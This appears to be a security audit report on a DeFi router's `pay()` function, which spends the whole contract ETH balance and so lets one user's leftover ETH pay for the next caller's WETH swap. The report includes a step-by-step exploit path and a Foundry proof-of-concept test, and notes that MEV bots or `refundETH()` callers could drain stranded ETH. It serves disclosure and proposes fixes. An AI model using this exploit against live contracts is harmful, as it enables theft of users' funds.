Audit Report

## Title
Unscoped `address(this).balance` in `pay()` allows consumption of leftover ETH from prior callers — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

## Summary
The `pay()` function in `PeripheryPayments` uses `address(this).balance` as the available native ETH when settling a WETH payment, without restricting it to the ETH contributed by the current caller. When a user sends excess `msg.value` and omits `refundETH()` from their multicall, the surplus ETH persists in the contract and is silently consumed by the next WETH-swap caller, causing a direct, quantifiable loss of the first user's principal.

## Finding Description
In `PeripheryPayments.pay()` (lines 73–84), when `token == WETH`, the function reads `uint256 nativeBalance = address(this).balance`, which is the **entire** contract balance, not the ETH contributed by the current transaction:

```solidity
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;   // total balance, not caller-scoped
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
    } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
    } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
    }
}
```

ETH enters the contract exclusively via `msg.value` on payable entry points (`exactInputSingle`, `exactInput`, `exactOutputSingle`, `exactOutput`, `multicall`, `addLiquidityExactShares`, `addLiquidityWeighted`). The `receive()` guard at line 32–34 blocks direct ETH sends from non-WETH addresses, so stranded ETH can only originate from a prior caller's unrefunded `msg.value`.

The intended usage pattern requires users to append `refundETH()` as the last call in a `multicall` batch. However, `refundETH()` (lines 58–63) sends **all** contract ETH to `msg.sender`, not the original depositor — meaning any third party can also drain stranded ETH by calling it directly.

**Exploit path:**
1. User A calls `router.multicall{value: 2 ether}(calls)` where `calls` contains only `exactInputSingle` (no `refundETH()`). The swap consumes e.g. 1000 wei of WETH; the remaining ~2 ETH stays in the router.
2. User B calls `router.exactInputSingle{value: 0}(...)` with `tokenIn == WETH`.
3. The pool calls back `metricOmmSwapCallback` → `_justPayCallback` → `pay(WETH, userB, pool, swapAmount)`.
4. Inside `pay()`, `nativeBalance = address(this).balance` returns User A's leftover ETH.
5. The contract wraps and transfers User A's ETH to settle User B's obligation. User B pays nothing; User A loses their surplus ETH.

Both `MetricOmmSimpleRouter` (via `_justPayCallback`, lines 192–199) and `MetricOmmPoolLiquidityAdder` (via `metricOmmModifyLiquidityCallback`, lines 172–177) share this `pay()` function, so both entry points are affected.

## Impact Explanation
Direct loss of user principal (ETH). The loss equals `msg.value - actual_swap_cost` for any user who sends excess ETH without appending `refundETH()`. This is not dust — a user sending 1 ETH for a small swap loses nearly 1 ETH. The attacker (next WETH-swap caller) receives the stolen ETH's equivalent in WETH at zero cost. This meets the Critical/High direct loss of user principal threshold.

## Likelihood Explanation
The intended multicall+refundETH pattern is shown in the test suite but is not enforced on-chain. Any user calling swap functions directly (not via multicall), or omitting `refundETH()` from their multicall, leaves ETH stranded. This is a realistic user-error path. The loss can be front-run by a MEV bot watching the mempool for transactions that leave ETH in the router, or simply claimed by the next organic WETH swap in the same block. No special privileges are required; any unprivileged caller can trigger the theft.

## Recommendation
Track per-call ETH contribution in transient storage (EIP-1153, already used in `MetricOmmPoolLiquidityAdder` for pay context) and cap `nativeBalance` in `pay()` to only the ETH attributed to the current call. Set a transient `msgValueBudget` slot at each payable entry point equal to `msg.value`, decrement it as ETH is consumed in `pay()`, and use that slot instead of `address(this).balance`. Alternatively, enforce at entry-point level that `msg.value` exactly equals the ETH portion of the swap, reverting if excess ETH is supplied without a corresponding `refundETH()` in the same multicall.

## Proof of Concept
```solidity
function test_ethTheft_via_leftoverBalance() public {
    uint128 swapAmount = 1_000;
    uint256 excessEth = 2 ether;

    // Step 1: userA swaps with excess ETH, omits refundETH()
    vm.prank(userA);
    bytes[] memory calls = new bytes[](1); // no refundETH
    calls[0] = abi.encodeWithSelector(
        router.exactInputSingle.selector,
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool), tokenIn: address(weth), tokenOut: address(token1),
            zeroForOne: true, amountIn: swapAmount, amountOutMinimum: 0,
            recipient: userA, deadline: block.timestamp + 1, priceLimitX64: 0, extensionData: ""
        })
    );
    router.multicall{value: excessEth}(calls);
    assertGt(address(router).balance, 0, "leftover ETH in router");

    // Step 2: userB swaps WETH with msg.value = 0; pay() consumes userA's leftover
    vm.prank(userB);
    router.exactInputSingle{value: 0}(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool), tokenIn: address(weth), tokenOut: address(token1),
            zeroForOne: true, amountIn: swapAmount, amountOutMinimum: 0,
            recipient: userB, deadline: block.timestamp + 1, priceLimitX64: 0, extensionData: ""
        })
    );

    // userB paid 0 ETH and 0 WETH, yet received token1
    assertEq(userB.balance, userBEthBefore, "userB spent no ETH");
    // userA lost (excessEth - swapAmount) beyond their intended swap cost
    assertLt(userA.balance, userAEthBefore - swapAmount, "userA lost excess ETH");
}
```
